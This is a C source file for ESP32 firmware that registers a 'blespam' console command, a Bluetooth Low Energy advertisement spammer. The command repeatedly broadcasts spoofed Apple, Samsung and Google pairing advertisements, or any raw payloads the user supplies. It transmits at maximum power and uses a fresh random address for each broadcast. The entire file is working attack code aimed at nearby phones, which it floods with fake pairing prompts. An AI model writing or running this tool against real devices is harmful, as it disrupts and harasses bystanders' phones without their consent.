#include "cmd_blespam.h"

#include "esp_console.h"
#include "esp_random.h"
#include "esp_log.h"
#include "argtable3/argtable3.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include "nvs_flash.h"
#include "driver/uart.h"
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#define TAG "blespam"

#ifndef ESP_PWR_LVL_P21
#define ESP_PWR_LVL_P21 ((esp_power_level_t)15)
#endif

#if CONFIG_IDF_TARGET_ESP32C3 || CONFIG_IDF_TARGET_ESP32C2 || CONFIG_IDF_TARGET_ESP32S3
  #define MAX_TX_POWER ESP_PWR_LVL_P21
#elif CONFIG_IDF_TARGET_ESP32H2 || CONFIG_IDF_TARGET_ESP32C6
  #define MAX_TX_POWER ESP_PWR_LVL_P20
#else
  #define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

static struct {
    struct arg_str *device;
    struct arg_str *custom;
    struct arg_end *end;
} blespam_args;

static bool ble_active = false;

static bool check_ctrl_c(void) {
    uint8_t d;
    return uart_read_bytes(CONFIG_ESP_CONSOLE_UART_NUM, &d, 1, 0) > 0 && d == 0x03;
}

static void generate_random_address(esp_bd_addr_t addr) {
    for (int i = 0; i < 6; i++) {
        addr[i] = esp_random() % 256;
        if (i == 0) addr[i] |= 0xF0;
    }
}

static void ble_init(void) {
    if (ble_active) return;

    ESP_ERROR_CHECK(nvs_flash_init());
    esp_bt_controller_status_t ctrl_status = esp_bt_controller_get_status();

    if (ctrl_status == ESP_BT_CONTROLLER_STATUS_IDLE) {
        esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    }
    if (ctrl_status != ESP_BT_CONTROLLER_STATUS_ENABLED) {
        ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_BLE));
    }

    esp_bluedroid_status_t bt_status = esp_bluedroid_get_status();
    if (bt_status == ESP_BLUEDROID_STATUS_UNINITIALIZED) {
        esp_bluedroid_config_t cfg = BT_BLUEDROID_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_bluedroid_init_with_cfg(&cfg));
    }
    if (bt_status != ESP_BLUEDROID_STATUS_ENABLED) {
        ESP_ERROR_CHECK(esp_bluedroid_enable());
    }

    ESP_ERROR_CHECK(esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER));
    ble_active = true;
}

static void ble_stop(void) {
    if (!ble_active) return;

    esp_ble_gap_stop_advertising();
    vTaskDelay(pdMS_TO_TICKS(100));

    if (esp_bluedroid_get_status() == ESP_BLUEDROID_STATUS_ENABLED) {
        ESP_ERROR_CHECK(esp_bluedroid_disable());
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    if (esp_bluedroid_get_status() == ESP_BLUEDROID_STATUS_INITIALIZED) {
        ESP_ERROR_CHECK(esp_bluedroid_deinit());
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (esp_bt_controller_get_status() == ESP_BT_CONTROLLER_STATUS_ENABLED) {
        ESP_ERROR_CHECK(esp_bt_controller_disable());
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    if (esp_bt_controller_get_status() == ESP_BT_CONTROLLER_STATUS_INITED) {
        ESP_ERROR_CHECK(esp_bt_controller_deinit());
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    ble_active = false;
}

static void print_adv(const uint8_t *data, size_t len) {
    printf("[ADV] %zu bytes: ", len);
    for (size_t i = 0; i < len; i++) {
        printf("%02X ", data[i]);
    }
    printf("\n");
}

static void send_raw_adv(const uint8_t *data, size_t len) {
    esp_bd_addr_t addr;
    generate_random_address(addr);
    ESP_ERROR_CHECK(esp_ble_gap_set_rand_addr(addr));

    esp_ble_adv_params_t adv_params = {
        .adv_int_min       = 0x20,
        .adv_int_max       = 0x40,
        .adv_type          = ADV_TYPE_IND,
        .own_addr_type     = BLE_ADDR_TYPE_RANDOM,
        .channel_map       = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };

    print_adv(data, len);
    ESP_ERROR_CHECK(esp_ble_gap_config_adv_data_raw((uint8_t *)data, len));
    ESP_ERROR_CHECK(esp_ble_gap_start_advertising(&adv_params));
}

static void send_named_adv(void) {
    char name[12];
    sprintf(name, "%08lX", (unsigned long)(esp_random()));

    uint8_t adv[31] = {0};
    uint8_t i = 0;

    adv[i++] = 2; adv[i++] = 0x01; adv[i++] = 0x06;
    size_t len = strlen(name);
    adv[i++] = len + 1; adv[i++] = 0x09;
    memcpy(&adv[i], name, len);
    i += len;

    send_raw_adv(adv, i);
}

static void send_device_adv(EBLEPayloadType type) {
    switch (type) {
        case DEVICE_NAME:
            send_named_adv();
            break;
        case DEVICE_APPLE: {
            bool useShort = esp_random() % 2;
            int idx = esp_random() % (useShort ? IOS_SHORT_COUNT : IOS_LONG_COUNT);
            send_raw_adv(
                useShort ? IOS_SHORT_MODELS[idx] : IOS_LONG_MODELS[idx],
                useShort ? sizeof(IOS_SHORT_MODELS[0]) : sizeof(IOS_LONG_MODELS[0])
            );
            break;
        }
        case DEVICE_SAMSUNG: {
            int idx = esp_random() % SAMSUNG_COUNT;
            uint8_t buf[15];
            memcpy(buf, SAMSUNG_MODELS[idx], sizeof(buf));
            buf[14] = esp_random() % 256;
            send_raw_adv(buf, sizeof(buf));
            break;
        }
        case DEVICE_GOOGLE: {
            static uint8_t tmpl[] = {
                0x02,0x01,0x02, 0x02,0x0A,0xEB,
                0x03,0x03,0x2C,0xFE, 0x06,0x16,0x2C,0xFE, 0x00,0x00,0x00
            };
            uint32_t model = GOOGLE_MODELS[esp_random() % GOOGLE_MODEL_COUNT];
            tmpl[14] = (model >> 16) & 0xFF;
            tmpl[15] = (model >> 8) & 0xFF;
            tmpl[16] = (model & 0xFF);
            send_raw_adv(tmpl, sizeof(tmpl));
            break;
        }
        default:
            break;
    }
}

static void parse_and_send_custom(const char *hex_list) {
    char *cpy = strdup(hex_list);
    char *tok = strtok(cpy, ",");
    while (tok) {
        size_t len = strlen(tok) / 2;
        uint8_t *buf = malloc(len);
        for (size_t j = 0; j < len; ++j) {
            sscanf(&tok[j*2], "%2hhx", &buf[j]);
        }
        send_raw_adv(buf, len);
        free(buf);
        vTaskDelay(pdMS_TO_TICKS(200));
        esp_ble_gap_stop_advertising();
        tok = strtok(NULL, ",");
    }
    free(cpy);
}

static EBLEPayloadType parse_device_type(const char *val) {
    if (!val) return DEVICE_NAME;
    if (strcasecmp(val, "apple") == 0)   return DEVICE_APPLE;
    if (strcasecmp(val, "samsung") == 0) return DEVICE_SAMSUNG;
    if (strcasecmp(val, "google") == 0)  return DEVICE_GOOGLE;
    if (strcasecmp(val, "name") == 0)    return DEVICE_NAME;
    return DEVICE_NAME;
}

static int do_blespam_cmd(int argc, char **argv) {
    int nerrors = arg_parse(argc, argv, (void **)&blespam_args);
    if (nerrors) {
        arg_print_errors(stderr, blespam_args.end, argv[0]);
        return 1;
    }

    ble_init();

    if (blespam_args.custom->count > 0) {
        parse_and_send_custom(blespam_args.custom->sval[0]);
    } else {
        EBLEPayloadType type = parse_device_type(
            blespam_args.device->count ? blespam_args.device->sval[0] : NULL
        );
        while (!check_ctrl_c()) {
            send_device_adv(type);
            vTaskDelay(pdMS_TO_TICKS(200));
            esp_ble_gap_stop_advertising();
        }
        printf("[BLE] Ctrl+C detected, stopping advertising.\n");
    }

    ble_stop();
    return 0;
}

void module_blespam(void) {
    blespam_args.device = arg_str0("d", "device", "<type>",
                                  "BLE device preset (apple, samsung, google, name)");
    blespam_args.custom = arg_str0("c", "custom", "<hex,…>",
                                  "Raw BLE payload(s), comma separated");
    blespam_args.end    = arg_end(2);

    const esp_console_cmd_t cmd = {
        .command  = "blespam",
        .help     = "BLE advertisement spammer",
        .func     = &do_blespam_cmd,
        .argtable = &blespam_args
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&cmd));
}
